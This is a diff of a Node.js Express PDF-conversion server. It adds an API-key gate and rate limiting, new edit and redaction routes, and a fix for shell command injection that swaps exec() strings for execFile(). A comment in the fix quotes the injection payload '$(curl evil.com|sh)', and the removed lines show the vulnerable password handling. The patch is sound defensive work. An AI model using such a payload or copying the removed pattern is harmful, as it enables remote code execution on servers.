@@ -1,10 +1,10 @@
 'use strict';
-const express  = require('express');
-const multer   = require('multer');
-const { exec } = require('child_process');
-const fs       = require('fs');
-const path     = require('path');
-const os       = require('os');
+const express     = require('express');
+const multer      = require('multer');
+const { execFile } = require('child_process');
+const fs          = require('fs');
+const path        = require('path');
+const os          = require('os');
 
 const app    = express();
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 100 * 1024 * 1024 } });
@@ -24,21 +24,74 @@ function setCors(req, res) {
   const allowed = !origin || ALLOWED_ORIGINS.includes(origin);
   res.set('Access-Control-Allow-Origin',   allowed ? (origin || '*') : 'null');
   res.set('Access-Control-Allow-Methods',  'GET, POST, OPTIONS');
-  res.set('Access-Control-Allow-Headers',  'Content-Type, Accept, X-Requested-With');
+  res.set('Access-Control-Allow-Headers',  'Content-Type, Accept, X-Requested-With, X-API-Key');
   res.set('Access-Control-Expose-Headers', 'Content-Disposition');
   res.set('Vary', 'Origin');
 }
 
-// Answer preflight immediately — before Render proxy can interfere
 app.options('*', (req, res) => {
   setCors(req, res);
   res.set('Access-Control-Max-Age', '86400');
   res.sendStatus(200);
 });
 
-// Inject CORS on every request
 app.use((req, res, next) => { setCors(req, res); next(); });
 app.use(express.json());
+
+// ── OPTIONAL SHARED-SECRET GATE ─────────────────────────────────────────────
+// Honesty about what this is and isn't: this is NOT real authentication.
+// It ships in the frontend's script.js, so anyone who opens dev tools and
+// reads the source can find it. What it DOES do is stop the casual,
+// automated abuse that shows up the moment a URL is discoverable — bots
+// scanning for open endpoints, scripts hammering /convert. If this server
+// ever handles documents on behalf of other real people (not just you),
+// this needs to be replaced with per-user tokens issued after a real login,
+// not a constant baked into client-side code.
+//
+// To enable: set API_KEY in Render's environment variables, then set the
+// same value as API_KEY in the frontend's script.js. Leave both unset to
+// disable this check entirely (useful for local testing).
+const API_KEY = process.env.API_KEY || null;
+function checkApiKey(req, res, next) {
+  if (!API_KEY) return next(); // disabled — no key configured
+  const provided = req.get('X-API-Key');
+  if (provided !== API_KEY) {
+    return res.status(401).json({ ok: false, error: 'Missing or invalid API key.' });
+  }
+  next();
+}
+
+// ── RATE LIMITING ────────────────────────────────────────────────────────
+// Basic in-memory sliding-window limiter, per client IP. Honest caveats:
+// state lives in process memory, so it resets on every deploy/restart, and
+// won't be shared across multiple server instances if this ever scales
+// beyond one. For a single free-tier Render instance this is a real and
+// useful backstop against one bad actor burning your compute quota — just
+// not a substitute for a proper limiter (e.g. Redis-backed) at real scale.
+const RATE_LIMIT_WINDOW_MS = 60 * 1000; // 1 minute
+const RATE_LIMIT_MAX       = 20;        // max requests per window per IP
+const hits = new Map(); // ip -> [timestamps]
+
+function rateLimit(req, res, next) {
+  const ip  = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || 'unknown';
+  const now = Date.now();
+  const arr = (hits.get(ip) || []).filter(t => now - t < RATE_LIMIT_WINDOW_MS);
+  arr.push(now);
+  hits.set(ip, arr);
+
+  if (arr.length > RATE_LIMIT_MAX) {
+    return res.status(429).json({ ok: false, error: 'Too many requests — please slow down and try again shortly.' });
+  }
+  next();
+}
+
+setInterval(() => {
+  const now = Date.now();
+  for (const [ip, arr] of hits) {
+    const fresh = arr.filter(t => now - t < RATE_LIMIT_WINDOW_MS);
+    if (fresh.length) hits.set(ip, fresh); else hits.delete(ip);
+  }
+}, RATE_LIMIT_WINDOW_MS).unref();
 
 // ── Helpers ───────────────────────────────────────────────────────────────
 function cleanup(dir) {
@@ -70,22 +123,25 @@ function convertWithKeepAlive(req, res, type, ext) {
   console.log(`[${type}] ${req.file.originalname} (${(req.file.size / 1024).toFixed(1)} KB)`);
   fs.writeFileSync(inFile, req.file.buffer);
 
-  // Open a chunked stream so Render proxy sees data flowing right away
   res.setHeader('Content-Type', 'application/json; charset=utf-8');
   res.setHeader('Transfer-Encoding', 'chunked');
-  res.setHeader('X-Accel-Buffering', 'no');   // disable nginx buffering on Render
+  res.setHeader('X-Accel-Buffering', 'no');
   res.setHeader('Cache-Control', 'no-cache');
-  res.flushHeaders();                           // push headers to client NOW
+  res.flushHeaders();
 
-  // Heartbeat: write a space every 5 seconds to prevent idle timeout
   const heartbeat = setInterval(() => {
     try { res.write(' '); } catch (_) { clearInterval(heartbeat); }
   }, 5000);
 
-  const cmd = `python3 "${path.join(__dirname, 'convert.py')}" ${type} "${inFile}" "${outFile}"`;
-  console.log(`[cmd] ${cmd}`);
+  // SECURITY: execFile with an argv array — never a shell string. `type`
+  // is always one of 'word'/'excel'/'pptx' (chosen by our own route, never
+  // user input), and inFile/outFile are paths we generated ourselves, but
+  // execFile is the correct tool regardless: no shell is invoked at all,
+  // so there is nothing here for a shell metacharacter to exploit.
+  const scriptPath = path.join(__dirname, 'convert.py');
+  console.log(`[exec] python3 ${scriptPath} ${type} ${inFile} ${outFile}`);
 
-  exec(cmd, { timeout: 180000 }, (err, stdout, stderr) => {
+  execFile('python3', [scriptPath, type, inFile, outFile], { timeout: 180000 }, (err, stdout, stderr) => {
     clearInterval(heartbeat);
     if (stdout) console.log(`[stdout] ${stdout}`);
     if (stderr) console.log(`[stderr] ${stderr}`);
@@ -100,13 +156,10 @@ function convertWithKeepAlive(req, res, type, ext) {
 
     try {
       const fileBytes = fs.readFileSync(outFile);
-      // Sanitize filename — decode buffer as latin1 to preserve bytes,
-      // then re-encode properly. Also strip non-ASCII for safe Content-Disposition.
       const rawName   = Buffer.from(req.file.originalname, 'latin1').toString('utf8');
       const safeName  = rawName.replace(/\.pdf$/i, `.${ext}`);
       cleanup(tmpDir);
 
-      // Send the file as base64 inside JSON — avoids binary streaming issues
       const payload = JSON.stringify({
         ok:       true,
         filename: safeName,
@@ -124,27 +177,27 @@ function convertWithKeepAlive(req, res, type, ext) {
 
 // ── Routes ────────────────────────────────────────────────────────────────
 app.get('/', (req, res) => {
-  res.json({ status: 'ok', service: 'PDF Studio Server', version: '3.0.0' });
+  res.json({ status: 'ok', service: 'PDF Studio Server', version: '3.1.0' });
 });
 
 app.get('/ping', (req, res) => {
   res.json({ ok: true, ts: Date.now() });
 });
 
-app.post('/convert/word',  upload.single('file'), (req, res) => {
+app.post('/convert/word',  checkApiKey, rateLimit, upload.single('file'), (req, res) => {
   convertWithKeepAlive(req, res, 'word', 'docx');
 });
 
-app.post('/convert/excel', upload.single('file'), (req, res) => {
+app.post('/convert/excel', checkApiKey, rateLimit, upload.single('file'), (req, res) => {
   convertWithKeepAlive(req, res, 'excel', 'xlsx');
 });
 
-app.post('/convert/pptx', (req, res) => {
+app.post('/convert/pptx', checkApiKey, rateLimit, (req, res) => {
   res.status(501).json({ ok: false, error: 'PDF to PowerPoint coming soon.' });
 });
 
 // ── Encrypt PDF (add password) ─────────────────────────────────────────────
-app.post('/encrypt', upload.single('file'), (req, res) => {
+app.post('/encrypt', checkApiKey, rateLimit, upload.single('file'), (req, res) => {
   if (!req.file) return res.status(400).json({ ok: false, error: 'No file uploaded.' });
   if (req.file.mimetype !== 'application/pdf') return res.status(400).json({ ok: false, error: 'PDF files only.' });
 
@@ -167,11 +220,16 @@ app.post('/encrypt', upload.single('file'), (req, res) => {
     try { res.write(' '); } catch (_) { clearInterval(heartbeat); }
   }, 5000);
 
+  // SECURITY FIX: previously this built a shell command string with
+  // JSON.stringify()'d passwords spliced in, which only escapes for
+  // JS/JSON — NOT for a shell. A password like `$(curl evil.com|sh)`
+  // would have been interpreted by /bin/sh and executed on the server.
+  // execFile with an argv array never invokes a shell at all, so the
+  // password is always passed as a single literal argument, however
+  // strange its contents, with zero risk of command injection.
   const scriptPath = path.join(__dirname, 'convert.py');
-  // Pass passwords as JSON-escaped CLI args — safe for all special chars
-  const cmd = `python3 "${scriptPath}" encrypt "${inFile}" "${outFile}" ${JSON.stringify(userPwd)} ${JSON.stringify(ownerPwd)}`;
 
-  exec(cmd, { timeout: 60000 }, (err, stdout, stderr) => {
+  execFile('python3', [scriptPath, 'encrypt', inFile, outFile, userPwd, ownerPwd], { timeout: 60000 }, (err, stdout, stderr) => {
     clearInterval(heartbeat);
     if (err || !fs.existsSync(outFile)) {
       cleanup(tmpDir);
@@ -190,7 +248,7 @@ app.post('/encrypt', upload.single('file'), (req, res) => {
 });
 
 // ── Decrypt PDF (remove password) ───────────────────────────────────────────
-app.post('/decrypt', upload.single('file'), (req, res) => {
+app.post('/decrypt', checkApiKey, rateLimit, upload.single('file'), (req, res) => {
   if (!req.file) return res.status(400).json({ ok: false, error: 'No file uploaded.' });
   if (req.file.mimetype !== 'application/pdf') return res.status(400).json({ ok: false, error: 'PDF files only.' });
 
@@ -211,15 +269,14 @@ app.post('/decrypt', upload.single('file'), (req, res) => {
     try { res.write(' '); } catch (_) { clearInterval(heartbeat); }
   }, 5000);
 
+  // Same fix as /encrypt — execFile, argv array, no shell involved.
   const scriptPath = path.join(__dirname, 'convert.py');
-  const cmd = `python3 "${scriptPath}" decrypt "${inFile}" "${outFile}" ${JSON.stringify(currentPwd)}`;
 
-  exec(cmd, { timeout: 60000 }, (err, stdout, stderr) => {
+  execFile('python3', [scriptPath, 'decrypt', inFile, outFile, currentPwd], { timeout: 60000 }, (err, stdout, stderr) => {
     clearInterval(heartbeat);
     if (err || !fs.existsSync(outFile)) {
       cleanup(tmpDir);
       const msg = stderr?.trim() || err?.message || 'Decryption failed';
-      // Surface wrong-password cases distinctly so the frontend can prompt again.
       const isBadPwd = /incorrect password/i.test(msg);
       res.end(JSON.stringify({ ok: false, error: isBadPwd ? 'Incorrect password.' : msg }));
       return;
@@ -235,8 +292,130 @@ app.post('/decrypt', upload.single('file'), (req, res) => {
   });
 });
 
+// ── Extract text spans (Edit Text — step 1: find what's clickable) ─────────
+app.post('/edit-text/extract', checkApiKey, rateLimit, upload.single('file'), (req, res) => {
+  if (!req.file) return res.status(400).json({ ok: false, error: 'No file uploaded.' });
+  if (req.file.mimetype !== 'application/pdf') return res.status(400).json({ ok: false, error: 'PDF files only.' });
+
+  const tmpDir  = fs.mkdtempSync(path.join(os.tmpdir(), 'pdfextract-'));
+  const inFile  = path.join(tmpDir, 'input.pdf');
+  const outFile = path.join(tmpDir, 'spans.json');
+  fs.writeFileSync(inFile, req.file.buffer);
+
+  res.setHeader('Content-Type', 'application/json; charset=utf-8');
+  res.setHeader('Transfer-Encoding', 'chunked');
+  res.setHeader('X-Accel-Buffering', 'no');
+  res.setHeader('Cache-Control', 'no-cache');
+  res.flushHeaders();
+  const heartbeat = setInterval(() => { try { res.write(' '); } catch (_) { clearInterval(heartbeat); } }, 5000);
+
+  const scriptPath = path.join(__dirname, 'convert.py');
+  execFile('python3', [scriptPath, 'extract-text', inFile, outFile], { timeout: 60000 }, (err, stdout, stderr) => {
+    clearInterval(heartbeat);
+    if (err || !fs.existsSync(outFile)) {
+      cleanup(tmpDir);
+      res.end(JSON.stringify({ ok: false, error: stderr?.trim() || err?.message || 'Text extraction failed' }));
+      return;
+    }
+    try {
+      const spansJson = fs.readFileSync(outFile, 'utf-8');
+      cleanup(tmpDir);
+      // spansJson is already a JSON object ({"pages":[...]}) — splice it
+      // straight into the response rather than double-encoding it as a string.
+      res.end(`{"ok":true,"result":${spansJson}}`);
+    } catch (e) {
+      cleanup(tmpDir);
+      res.end(JSON.stringify({ ok: false, error: e.message }));
+    }
+  });
+});
+
+// ── Apply text edits (Edit Text — step 2: genuinely remove old text, draw new) ──
+app.post('/edit-text/apply', checkApiKey, rateLimit, upload.single('file'), (req, res) => {
+  if (!req.file) return res.status(400).json({ ok: false, error: 'No file uploaded.' });
+  if (req.file.mimetype !== 'application/pdf') return res.status(400).json({ ok: false, error: 'PDF files only.' });
+
+  let edits;
+  try { edits = JSON.parse(req.body.edits || '[]'); }
+  catch (_) { return res.status(400).json({ ok: false, error: 'Invalid edits payload.' }); }
+
+  const tmpDir    = fs.mkdtempSync(path.join(os.tmpdir(), 'pdfedit-'));
+  const inFile    = path.join(tmpDir, 'input.pdf');
+  const outFile   = path.join(tmpDir, 'output.pdf');
+  const editsFile = path.join(tmpDir, 'edits.json');
+  fs.writeFileSync(inFile, req.file.buffer);
+  fs.writeFileSync(editsFile, JSON.stringify(edits));
+
+  res.setHeader('Content-Type', 'application/json; charset=utf-8');
+  res.setHeader('Transfer-Encoding', 'chunked');
+  res.setHeader('X-Accel-Buffering', 'no');
+  res.setHeader('Cache-Control', 'no-cache');
+  res.flushHeaders();
+  const heartbeat = setInterval(() => { try { res.write(' '); } catch (_) { clearInterval(heartbeat); } }, 5000);
+
+  const scriptPath = path.join(__dirname, 'convert.py');
+  execFile('python3', [scriptPath, 'apply-text-edits', inFile, outFile, editsFile], { timeout: 120000 }, (err, stdout, stderr) => {
+    clearInterval(heartbeat);
+    if (err || !fs.existsSync(outFile)) {
+      cleanup(tmpDir);
+      res.end(JSON.stringify({ ok: false, error: stderr?.trim() || err?.message || 'Text edit failed' }));
+      return;
+    }
+    try {
+      const fileBytes = fs.readFileSync(outFile);
+      cleanup(tmpDir);
+      res.end(JSON.stringify({ ok: true, data: fileBytes.toString('base64'), filename: 'edited.pdf', mime: 'application/pdf' }));
+    } catch (e) {
+      cleanup(tmpDir);
+      res.end(JSON.stringify({ ok: false, error: e.message }));
+    }
+  });
+});
+
+// ── Redact (TRUE removal, not a painted box — see convert.py's redact_apply) ──
+app.post('/redact/apply', checkApiKey, rateLimit, upload.single('file'), (req, res) => {
+  if (!req.file) return res.status(400).json({ ok: false, error: 'No file uploaded.' });
+  if (req.file.mimetype !== 'application/pdf') return res.status(400).json({ ok: false, error: 'PDF files only.' });
+
+  let redactions;
+  try { redactions = JSON.parse(req.body.redactions || '[]'); }
+  catch (_) { return res.status(400).json({ ok: false, error: 'Invalid redactions payload.' }); }
+
+  const tmpDir  = fs.mkdtempSync(path.join(os.tmpdir(), 'pdfredact-'));
+  const inFile  = path.join(tmpDir, 'input.pdf');
+  const outFile = path.join(tmpDir, 'output.pdf');
+  const redFile = path.join(tmpDir, 'redactions.json');
+  fs.writeFileSync(inFile, req.file.buffer);
+  fs.writeFileSync(redFile, JSON.stringify(redactions));
+
+  res.setHeader('Content-Type', 'application/json; charset=utf-8');
+  res.setHeader('Transfer-Encoding', 'chunked');
+  res.setHeader('X-Accel-Buffering', 'no');
+  res.setHeader('Cache-Control', 'no-cache');
+  res.flushHeaders();
+  const heartbeat = setInterval(() => { try { res.write(' '); } catch (_) { clearInterval(heartbeat); } }, 5000);
+
+  const scriptPath = path.join(__dirname, 'convert.py');
+  execFile('python3', [scriptPath, 'redact', inFile, outFile, redFile], { timeout: 120000 }, (err, stdout, stderr) => {
+    clearInterval(heartbeat);
+    if (err || !fs.existsSync(outFile)) {
+      cleanup(tmpDir);
+      res.end(JSON.stringify({ ok: false, error: stderr?.trim() || err?.message || 'Redaction failed' }));
+      return;
+    }
+    try {
+      const fileBytes = fs.readFileSync(outFile);
+      cleanup(tmpDir);
+      res.end(JSON.stringify({ ok: true, data: fileBytes.toString('base64'), filename: 'redacted.pdf', mime: 'application/pdf' }));
+    } catch (e) {
+      cleanup(tmpDir);
+      res.end(JSON.stringify({ ok: false, error: e.message }));
+    }
+  });
+});
+
 // ── Start ─────────────────────────────────────────────────────────────────
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`PDF Studio Server v3 running on port ${PORT}`);
+  console.log(`PDF Studio Server v3.1 running on port ${PORT}${API_KEY ? ' (API key required)' : ' (no API key set — open access)'}`);
 });
